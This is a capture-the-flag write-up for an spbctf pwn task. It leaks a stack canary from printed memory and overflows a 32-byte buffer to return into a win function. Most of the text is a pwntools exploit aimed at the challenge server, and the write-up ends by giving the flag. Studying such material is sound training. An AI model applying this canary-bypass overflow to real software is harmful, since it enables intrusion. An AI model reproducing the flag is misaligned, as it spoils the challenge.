TASK
__________
You were presented with a piece of the stack. Find a canary in it and move

nc 109.233.56.90 11607

https://pwn.spbctf.ru/tasks/pwn2_mc6
__________

![image](https://user-images.githubusercontent.com/76822573/112986998-e20d1080-916a-11eb-9de6-af5af6e89791.png)

when executing a binary file, you can see that we were immediately given a piece of the stack, which apparently 
contains the stack canary. We need to get it out of there and substitute it in the overflow to avoid the
*** stack smashing detected *** error, which occurs in case of overwriting the stack canary

![image](https://user-images.githubusercontent.com/76822573/112987394-58aa0e00-916b-11eb-821a-2fe51af1c858.png)

for clarity, let's display all the bytes in a group of 8 at once in order to share 64-bit pieces of memory.
In these bytes, it is very easy to notice that there is a stack canary, since there is always a zero byte first,
and after it a large number

in our case, this is memory 0x00 0x6c 0xf8 0x84 0x4c 0xde 0xc3 0xba

However, there are several byte strings that start with a zero byte, so you need to write a script that will
split the string into a list of int and then manipulate each such list.

Let's write a Python3 script using pwntools resources to connect to a binary file or to remotely connect to a server.

from pwn import *

r = remote('109.233.56.90',11607)

#r = process('./stackgift')

win = r.recvuntil('Now')

k = 0

temp = ''

li = list()

win = win[:-4]

for i in win:

    temp = temp + str(i) + ' '
    
    k = k+1
    
    print(hex(i),end=' ')
    
    if k == 8:
    
        print('\n')
        
        k = 0
        
        li.append(temp)
        
        temp = ''
        
#output bytes in a group of 8 and list them

print(li)

print('')

for i in range(0,len(li)):

    if((li[i][0]=='0')):
    
        print(li[i][-2:])
        
        if li[i][2] == '0':
        
            print('')
            
        else:
        
            print(li[i])
            
            kek = li[i]
            
#sorting the received list elements by first zero, and if element 3 ('| 0 || || 0 |') is equal to 0,

then do not remember it

print(kek)

lis = list()

kek = kek[:-1]

x = [int(i) for i in kek.split(' ')]

print(x)

r.interactive()

#convert string to list of int to manipulate the resulting values

we now have a saved canary. It remains to figure out how many bytes need to be overwritten before overwriting
the canary and return address
for this we will use IDA PRO

![image](https://user-images.githubusercontent.com/76822573/112989370-85f7bb80-916d-11eb-955c-2434c3fcb1c3.png)

in this piece of the program, we see that the buffer size is 32, and the write is 128. This is a vulnerability that
we need to exploit

![image](https://user-images.githubusercontent.com/76822573/112989604-c35c4900-916d-11eb-8d8a-254721b92a38.png)

you can see that the char array itself takes 0x20 bytes, after that comes 8 bytes of some unnecessary information,
and starting from 40 bytes our stack canary begins, and we will substitute our resulting value there. But what to
write to the return address? To do this, we need to find the address of the function that gives us the correct answer to the task

we will use IDA PRO again for this

![image](https://user-images.githubusercontent.com/76822573/112990036-4382ae80-916e-11eb-8203-31813a186d2f.png)

it is easy to see the win function, inside which there is a function that opens the flag file
Let's find her address

![image](https://user-images.githubusercontent.com/76822573/112990209-76c53d80-916e-11eb-9798-6894859830f2.png)

the address of our function is 0x401182

Now we can finish writing our exploit and get an answer to the task.

from pwn import *

r = remote('109.233.56.90',11607)

#r = process('./stackgift')

win = r.recvuntil('Now')


k = 0

temp = ''

li = list()

win = win[:-4]

for i in win:

    temp = temp + str(i) + ' '
    
    k = k+1
    
    print(hex(i),end=' ')
    
    if k == 8:
    
        print('\n')
        
        k = 0
        
        li.append(temp)
        
        temp = ''
        

print(li)

print('')

for i in range(0,len(li)):

    if((li[i][0]=='0')):
    
        print(li[i][-2:])
        
        if li[i][2] == '0':
        
            print('')
            
        else:
        
            print(li[i])
            
            kek = li[i]
            


print(kek)

lis = list()

kek = kek[:-1]

x = [int(i) for i in kek.split(' ')]

print(x)

kuk = b''

for i in x:

    kuk = kuk + p8(i)
    
    
#converting list of int to byte string with stack canary value

payload = b'A'*40+kuk+b'A'*8+p64(0x401182)

#40 bytes of trash, kuk = stack canary, 8 bytes of rpb register and 8 bytes for return address, that we change.

r.send(payload)


r.recv()

r.interactive()


![image](https://user-images.githubusercontent.com/76822573/112990748-11be1780-916f-11eb-9bbb-582fdeea4e68.png)

The answer is: spbctf{__bytecode__}
